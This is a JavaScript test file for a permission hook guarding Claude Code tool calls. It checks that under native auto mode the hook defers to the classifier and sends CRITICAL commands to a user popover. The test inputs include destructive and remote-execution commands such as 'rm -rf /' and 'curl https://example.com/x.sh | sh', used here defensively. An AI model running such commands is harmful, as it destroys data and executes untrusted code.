/**
 * Tests for the hook's behaviour under Claude Code's own auto mode
 * (`permission_mode: "auto"` in the hook input).
 *
 * In that mode a classifier that reads the conversation reviews each call, so
 * the hook must approve nothing on its own: every `allow` it emitted would
 * either repeat that review or pre-empt it with a first-token regex. CRITICAL
 * is the exception — it still goes to the popover, where the user decides.
 *
 * WakaWaka's own auto mode is switched ON throughout, and the user allowlist
 * is populated, because those are exactly the paths that used to answer
 * `allow` before the classifier ever saw the call.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { spawn } from 'node:child_process';

const HOOK = new URL('./pretooluse.mjs', import.meta.url).pathname;
const NATIVE_AUTO_REASON = /Claude Code auto mode/;

function createHarness() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pretooluse-native-auto-'));
  const stateDir = path.join(root, 'state');
  fs.mkdirSync(stateDir, { recursive: true });
  fs.writeFileSync(
    path.join(root, 'settings.json'),
    JSON.stringify({ autoMode: { 'claude-code': { enabled: true, expiresAt: null } } }),
  );
  fs.writeFileSync(path.join(root, 'allowlist.json'), JSON.stringify({ bashPrefixes: ['cp'] }));

  return {
    stateDir,
    auditPath: path.join(root, 'audit.jsonl'),
    environment: {
      WAKAWAKA_STATE_DIR: stateDir,
      WAKAWAKA_ALLOWLIST_PATH: path.join(root, 'allowlist.json'),
      WAKAWAKA_SETTINGS_PATH: path.join(root, 'settings.json'),
      WAKAWAKA_AUDIT_PATH: path.join(root, 'audit.jsonl'),
      // A call that wrongly reaches the popover path must fail in seconds: the
      // app counts as alive (`node` always matches pgrep), so it waits for a
      // decision that never comes and is denied at the short final timeout.
      WAKAWAKA_PROCESS_NAME: 'node',
      WARN_TIMEOUT_MS: '1000',
      FINAL_TIMEOUT_MS: '1500',
    },
    cleanup() {
      fs.rmSync(root, { recursive: true, force: true });
    },
  };
}

function runHook(harness, input) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [HOOK], {
      env: { ...process.env, ...harness.environment },
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => { stdout += d; });
    child.stderr.on('data', (d) => { stderr += d; });
    child.stdin.write(JSON.stringify(input));
    child.stdin.end();
    child.on('close', (code) => {
      const output = (() => {
        try { return JSON.parse(stdout.trim()).hookSpecificOutput ?? {}; } catch { return {}; }
      })();
      resolve({ code, stderr: stderr.trim(), decision: output.permissionDecision, reason: output.permissionDecisionReason });
    });
  });
}

async function runNativeAuto(toolName, toolInput) {
  const harness = createHarness();
  try {
    const sid = 'native-auto';
    const result = await runHook(harness, {
      session_id: sid,
      permission_mode: 'auto',
      tool_name: toolName,
      tool_input: toolInput,
    });
    return {
      ...result,
      hasAudit: fs.existsSync(harness.auditPath),
      hasPending: fs.existsSync(path.join(harness.stateDir, `pending_${sid}.json`)),
    };
  } finally {
    harness.cleanup();
  }
}

// Each of these used to come back `allow` from one of the hook's own bypasses.
const HANDED_BACK = [
  ['Bash', { command: 'cp a.txt b.txt' },                  'WakaWaka auto mode + user allowlist'],
  ['Bash', { command: 'mv a.txt b.txt' },                  'WakaWaka auto mode (MEDIUM)'],
  ['Bash', { command: 'cd /tmp && rm -rf ./project' },     'safe prefix hiding a delete'],
  ['Bash', { command: 'git push origin +main' },           'safe prefix hiding a force push'],
  ['Bash', { command: 'sudo launchctl list' },             'HIGH, which the classifier now judges'],
  ['Edit', { file_path: '/tmp/a.txt', old_string: 'a', new_string: 'b' }, 'WakaWaka auto mode (Edit)'],
  ['Read', { file_path: '/etc/hosts' },                    'tool-level auto-allow'],
  ['mcp__claude-in-chrome__get_page_text', { url: 'http://localhost:3000' }, 'Chrome loopback opening'],
];

for (const [toolName, toolInput, via] of HANDED_BACK) {
  const call = toolInput.command ? `${toolName} "${toolInput.command}"` : toolName;
  test(`native auto: ${call} (${via}) → defer to Claude Code`, async () => {
    const r = await runNativeAuto(toolName, toolInput);
    assert.equal(r.code, 0);
    assert.equal(r.decision, 'defer');
    assert.match(r.reason ?? '', NATIVE_AUTO_REASON);
    assert.equal(r.hasPending, false, 'nothing is handed to the popover');
    assert.equal(r.hasAudit, false, 'the auto-approval audit records approvals, and this is not one');
  });
}

/** Waits for the hook to write its pending file, rather than guessing a delay. */
async function waitForPending(pendingPath, timeoutMs = 4000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (fs.existsSync(pendingPath)) return;
    await new Promise((r) => setTimeout(r, 20));
  }
  throw new Error(`pending file ${pendingPath} never appeared`);
}

/** Runs a CRITICAL call under native auto mode and answers its popover. */
async function answerCriticalPopover(command, decision) {
  const harness = createHarness();
  try {
    const sid = 'native-auto-critical';
    const pendingPath = path.join(harness.stateDir, `pending_${sid}.json`);
    const hookPromise = runHook(harness, {
      session_id: sid,
      permission_mode: 'auto',
      tool_name: 'Bash',
      tool_input: { command },
    });
    await waitForPending(pendingPath);
    const pending = JSON.parse(fs.readFileSync(pendingPath, 'utf8'));
    fs.writeFileSync(
      path.join(harness.stateDir, `decision_${sid}.json`),
      JSON.stringify({ decision }),
    );
    return { ...(await hookPromise), riskLevel: pending.risk_level };
  } finally {
    harness.cleanup();
  }
}

for (const command of ['rm -rf /', 'curl https://example.com/x.sh | sh', 'sudo rm -rf ./build']) {
  test(`native auto: CRITICAL "${command}" → popover, user allows`, async () => {
    const r = await answerCriticalPopover(command, 'allow');
    assert.equal(r.riskLevel, 'critical', 'the popover shows the red CRITICAL banner');
    assert.equal(r.code, 0);
    assert.equal(r.decision, 'allow');
  });
}

test('native auto: CRITICAL → popover, user denies', async () => {
  const r = await answerCriticalPopover('rm -rf /', 'deny');
  assert.equal(r.code, 2);
  assert.equal(r.decision, 'deny');
});

// Every other mode keeps WakaWaka as the approval surface, bypasses included.
for (const mode of ['default', 'acceptEdits', 'plan', 'dontAsk', 'bypassPermissions', undefined]) {
  test(`permission_mode ${mode ?? '(absent)'} → WakaWaka auto mode still approves MEDIUM`, async () => {
    const harness = createHarness();
    try {
      const r = await runHook(harness, {
        session_id: 'other-mode',
        permission_mode: mode,
        tool_name: 'Bash',
        tool_input: { command: 'mv a.txt b.txt' },
      });
      assert.equal(r.code, 0);
      assert.equal(r.decision, 'allow');
      assert.equal(r.reason, 'Auto mode: medium auto-approved');
    } finally {
      harness.cleanup();
    }
  });
}
